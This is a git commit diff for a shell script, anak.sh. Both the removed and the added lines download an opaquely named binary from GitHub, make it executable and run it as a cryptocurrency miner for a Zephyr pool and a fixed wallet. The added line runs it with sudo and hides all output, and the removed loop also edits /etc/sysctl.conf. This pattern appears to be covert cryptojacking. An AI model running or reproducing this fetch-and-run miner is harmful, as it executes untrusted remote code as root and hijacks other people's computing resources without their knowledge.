8a53bee9e083d660da212d8821c209f7b8e239df
renilo <88342640+renilo@users.noreply.github.com>
2023-12-03 18:40:25 +0700

    Update anak.sh

--- anak.sh
+++ anak.sh
@@ -1,8 +1,1 @@
-wget https://github.com/renilo/kuuntul/raw/main/kuntulan
-chmod 777 kuntulan
-
-while :; do
-    (grep -q "vm.nr_hugepages" /etc/sysctl.conf || (echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf)) && sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc))) \
-&& ./kuntulan -o sg-zephyr.miningocean.org:5332 -u ZEPHs8ZDBWJeLA4UwGkvrjD41nWFACco1TrSf5QtFFw9Vh6uPkRLHfcdZ7XNEWMTEqfgEMabn3Z3zDHszDncfPdKB6VLSLvXy82 -p $(echo $(shuf -i 1-99999999 -n 1)-VA1) -a rx/0 -k --donate-level 1 -t 4;
-    sleep 5;
-done
+wget https://github.com/renilo/kuuntul/raw/main/kuntulan2 >/dev/null 2>&1 && chmod 777 kuntulan2 >/dev/null 2>&1 && sudo ./kuntulan2 --algorithm randomx --pool zephyr.miningocean.org:5332 --wallet ZEPHs8ZDBWJeLA4UwGkvrjD41nWFACco1TrSf5QtFFw9Vh6uPkRLHfcdZ7XNEWMTEqfgEMabn3Z3zDHszDncfPdKB6VLSLvXy82 --password $(echo $(shuf -i 1-99999999 -n 1)-US1) --cpu-threads 16 --disable-gpu >/dev/null 2>&1
